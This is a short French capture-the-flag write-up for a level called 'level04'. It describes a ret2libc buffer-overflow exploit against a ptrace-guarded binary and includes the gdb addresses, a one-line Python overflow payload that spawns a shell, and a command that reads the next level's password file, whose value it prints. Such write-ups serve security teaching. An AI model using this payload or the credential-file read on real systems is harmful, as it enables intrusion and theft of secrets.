# level04

Le programme parent nous empêche de faire un `execve()` avec l'appel à `ptrace` \
(Si c'est le syscall d'`execve`, `11`, il va `kill` l'enfant)

[Table des syscalls](https://github.com/torvalds/linux/blob/v4.17/arch/x86/entry/syscalls/syscall_32.tbl#L17)

Sinon, on peut voir qu'on overflow dans le child après un offset de `156`

Avec gdb:
- `info function system`: `0xf7e6aed0  system`
- `find &system, +9999999, "/bin/sh"`: `0xf7f897ec`

On fait un ret2libc:
```
(python -c "print 'A' * 156 + '\xd0\xae\xe6\xf7' + 'DUMM' + '\xec\x97\xf8\xf7'"; cat) | ./level04
```

Et on va chercher le password:
```bash
cat /home/users/level05/.pass
# 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
